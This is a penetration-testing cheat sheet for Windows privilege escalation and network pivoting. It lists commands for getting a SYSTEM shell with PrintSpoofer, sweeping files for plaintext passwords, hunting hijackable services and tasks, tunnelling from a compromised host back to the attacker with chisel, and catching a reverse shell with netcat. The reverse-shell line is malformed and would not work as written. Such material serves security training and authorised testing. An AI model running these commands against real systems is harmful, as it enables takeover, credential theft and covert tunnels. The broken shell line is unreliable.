# Windows Privilege Escalation, Reverse Proxies & CMD Hacking

## Windows Privilege Escalation

### Run winpeas for automated enumeration

```
.\winPEASx64.exe
```

**Use when:** First thing on a Windows shell — same role as linpeas on Linux.

---

### Check current privileges

```
whoami /priv
```

**Use when:** Look for `SeImpersonatePrivilege` or `SeBackupPrivilege` — both are common instant-privesc paths.

---

### Abuse SeImpersonatePrivilege (Potato-family)

```
.\PrintSpoofer64.exe -i -c cmd
```

**Use when:** `whoami /priv` shows `SeImpersonatePrivilege` enabled — near-guaranteed SYSTEM shell.

---

### Check for unquoted service paths

```
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\\"
```

**Use when:** Hunting for a service binary path that could be hijacked due to missing quotes.

---

### Check scheduled tasks

```
schtasks /query /fo LIST /v
```

**Use when:** Looking for a task run as SYSTEM/admin that executes a file you can overwrite.

---

### Search for stored credentials in files

```
findstr /si password *.txt *.xml *.config
```

**Use when:** Sweeping the filesystem for accidentally saved plaintext credentials.

---

## Reverse Proxies & CMD Hacking

### Set up a reverse proxy pivot with chisel (server side, on attack box)

```
./chisel server -p <port> --reverse
```

**Use when:** Pivoting into an internal network from a compromised host with outbound access only.

---

### Chisel client (on the compromised host)

```
./chisel client <your-ip>:<port> R:socks
```

**Use when:** Pairing with the chisel server above to build a SOCKS proxy back through the compromised box.

---

### Route tool traffic through the pivot via proxychains

```
proxychains nmap -sT -p<ports> <internal-target-ip>
```

**Use when:** Scanning internal hosts only reachable through your pivot.

---

### Spawn a semi-interactive cmd shell over netcat

```
nc -lvnp <port>
# on target: cmd /c <your-ip>:<port>  (or via powershell reverse shell one-liner)
```

**Use when:** Basic Windows initial-access shell catch before upgrading to something more stable (e.g. Meterpreter or an SSH tunnel).
